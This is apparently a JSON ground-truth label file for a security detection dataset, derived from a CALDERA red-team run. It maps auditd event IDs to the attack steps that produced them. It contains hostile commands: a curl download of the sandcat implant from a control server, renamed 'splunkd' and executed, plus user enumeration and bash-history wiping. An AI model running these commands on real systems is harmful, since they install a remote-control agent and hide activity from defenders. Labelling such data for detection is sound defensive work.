@@ -1,0 +1,341 @@
+{
+ "category": "attack",
+ "malicious_event_ids": [
+  "smoke_ws-fin01_1200:auditd:0",
+  "smoke_ws-fin01_1200:auditd:1",
+  "smoke_ws-fin01_1200:auditd:2",
+  "smoke_ws-fin01_1200:auditd:3",
+  "smoke_ws-fin01_1200:auditd:4",
+  "smoke_ws-fin01_1200:auditd:5",
+  "smoke_ws-fin01_1200:auditd:6",
+  "smoke_ws-fin01_1200:auditd:7",
+  "smoke_ws-fin01_1200:auditd:8",
+  "smoke_ws-fin01_1200:auditd:9",
+  "smoke_ws-fin01_1200:auditd:10",
+  "smoke_ws-fin01_1200:auditd:11",
+  "smoke_ws-fin01_1200:auditd:12",
+  "smoke_ws-fin01_1200:auditd:13",
+  "smoke_ws-fin01_1200:auditd:14",
+  "smoke_ws-fin01_1200:auditd:15",
+  "smoke_ws-fin01_1200:auditd:16",
+  "smoke_ws-fin01_1200:auditd:17",
+  "smoke_ws-fin01_1200:auditd:18",
+  "smoke_ws-fin01_1200:auditd:19",
+  "smoke_ws-fin01_1200:auditd:20",
+  "smoke_ws-fin01_1200:auditd:21",
+  "smoke_ws-fin01_1200:auditd:22",
+  "smoke_ws-fin01_1200:auditd:23",
+  "smoke_ws-fin01_1200:auditd:24",
+  "smoke_ws-fin01_1200:auditd:25",
+  "smoke_ws-fin01_1200:auditd:26",
+  "smoke_ws-fin01_1200:auditd:27",
+  "smoke_ws-fin01_1200:auditd:28",
+  "smoke_ws-fin01_1200:auditd:29",
+  "smoke_ws-fin01_1200:auditd:30",
+  "smoke_ws-fin01_1200:auditd:31",
+  "smoke_ws-fin01_1200:auditd:32",
+  "smoke_ws-fin01_1200:auditd:33",
+  "smoke_ws-fin01_1200:auditd:34",
+  "smoke_ws-fin01_1200:auditd:35",
+  "smoke_ws-fin01_1200:auditd:36",
+  "smoke_ws-fin01_1200:auditd:37",
+  "smoke_ws-fin01_1200:auditd:38",
+  "smoke_ws-fin01_1200:auditd:39",
+  "smoke_ws-fin01_1200:auditd:40",
+  "smoke_ws-fin01_1200:auditd:41",
+  "smoke_ws-fin01_1200:auditd:42",
+  "smoke_ws-fin01_1200:auditd:43",
+  "smoke_ws-fin01_1200:auditd:44",
+  "smoke_ws-fin01_1200:auditd:45",
+  "smoke_ws-fin01_1200:auditd:46"
+ ],
+ "abilities": [
+  {
+   "name": "Agent deployment",
+   "status": "success",
+   "technique_id": "T1105",
+   "command": "curl -s -X POST -H file:sandcat.go -H platform:linux -H architecture:arm64 http://192.168.64.8:8888/file/download ; chmod +x splunkd ; file splunkd ; ./splunkd -server http://192.168.64.8:8888 -group red -v",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:0",
+    "smoke_ws-fin01_1200:auditd:1",
+    "smoke_ws-fin01_1200:auditd:2",
+    "smoke_ws-fin01_1200:auditd:3"
+   ],
+   "bootstrap": false,
+   "deployment": true,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:0",
+    "smoke_ws-fin01_1200:auditd:1",
+    "smoke_ws-fin01_1200:auditd:2",
+    "smoke_ws-fin01_1200:auditd:3"
+   ]
+  },
+  {
+   "name": "Identify active user",
+   "status": "success",
+   "technique_id": "T1033",
+   "command": "whoami",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:5",
+    "smoke_ws-fin01_1200:auditd:6"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:5",
+    "smoke_ws-fin01_1200:auditd:6"
+   ]
+  },
+  {
+   "name": "Find local users",
+   "status": "success",
+   "technique_id": "T1087.001",
+   "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:7",
+    "smoke_ws-fin01_1200:auditd:8",
+    "smoke_ws-fin01_1200:auditd:9",
+    "smoke_ws-fin01_1200:auditd:10"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:7",
+    "smoke_ws-fin01_1200:auditd:8",
+    "smoke_ws-fin01_1200:auditd:9",
+    "smoke_ws-fin01_1200:auditd:10"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep polkitd",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:11",
+    "smoke_ws-fin01_1200:auditd:12",
+    "smoke_ws-fin01_1200:auditd:13"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:11",
+    "smoke_ws-fin01_1200:auditd:12",
+    "smoke_ws-fin01_1200:auditd:13"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep sshd",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:14",
+    "smoke_ws-fin01_1200:auditd:15",
+    "smoke_ws-fin01_1200:auditd:16"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:14",
+    "smoke_ws-fin01_1200:auditd:15",
+    "smoke_ws-fin01_1200:auditd:16"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep tcpdump",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:17",
+    "smoke_ws-fin01_1200:auditd:18",
+    "smoke_ws-fin01_1200:auditd:19"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:17",
+    "smoke_ws-fin01_1200:auditd:18",
+    "smoke_ws-fin01_1200:auditd:19"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep systemd-resolve",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:20",
+    "smoke_ws-fin01_1200:auditd:21",
+    "smoke_ws-fin01_1200:auditd:22"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:20",
+    "smoke_ws-fin01_1200:auditd:21",
+    "smoke_ws-fin01_1200:auditd:22"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep messagebus",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:23",
+    "smoke_ws-fin01_1200:auditd:24",
+    "smoke_ws-fin01_1200:auditd:25"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:23",
+    "smoke_ws-fin01_1200:auditd:24",
+    "smoke_ws-fin01_1200:auditd:25"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep uuidd",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:26",
+    "smoke_ws-fin01_1200:auditd:27",
+    "smoke_ws-fin01_1200:auditd:28"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:26",
+    "smoke_ws-fin01_1200:auditd:27",
+    "smoke_ws-fin01_1200:auditd:28"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep systemd-timesync",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:29",
+    "smoke_ws-fin01_1200:auditd:30",
+    "smoke_ws-fin01_1200:auditd:31"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:29",
+    "smoke_ws-fin01_1200:auditd:30",
+    "smoke_ws-fin01_1200:auditd:31"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep systemd-network",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:32",
+    "smoke_ws-fin01_1200:auditd:33",
+    "smoke_ws-fin01_1200:auditd:34"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:32",
+    "smoke_ws-fin01_1200:auditd:33",
+    "smoke_ws-fin01_1200:auditd:34"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep nobody",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:35",
+    "smoke_ws-fin01_1200:auditd:36",
+    "smoke_ws-fin01_1200:auditd:37"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:35",
+    "smoke_ws-fin01_1200:auditd:36",
+    "smoke_ws-fin01_1200:auditd:37"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep irc",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:38",
+    "smoke_ws-fin01_1200:auditd:39",
+    "smoke_ws-fin01_1200:auditd:40"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:38",
+    "smoke_ws-fin01_1200:auditd:39",
+    "smoke_ws-fin01_1200:auditd:40"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep list",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:41",
+    "smoke_ws-fin01_1200:auditd:42",
+    "smoke_ws-fin01_1200:auditd:43"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:41",
+    "smoke_ws-fin01_1200:auditd:42",
+    "smoke_ws-fin01_1200:auditd:43"
+   ]
+  },
+  {
+   "name": "Find user processes",
+   "status": "success",
+   "technique_id": "T1057",
+   "command": "ps aux | grep backup",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:44",
+    "smoke_ws-fin01_1200:auditd:45",
+    "smoke_ws-fin01_1200:auditd:46"
+   ],
+   "bootstrap": false,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:44",
+    "smoke_ws-fin01_1200:auditd:45",
+    "smoke_ws-fin01_1200:auditd:46"
+   ]
+  },
+  {
+   "name": "Bootstrap T1070.003",
+   "status": "success",
+   "technique_id": "T1070.003",
+   "command": "> $HOME/.bash_history && unset HISTFILE",
+   "event_ids": [
+    "smoke_ws-fin01_1200:auditd:4"
+   ],
+   "bootstrap": true,
+   "deployment": false,
+   "process_event_ids": [
+    "smoke_ws-fin01_1200:auditd:4"
+   ]
+  }
+ ],
+ "source": "CALDERA report smoke-discovery_report.json + bootstrap actions from ground_truth.json: step pid + descendants, agent lineage"
+}
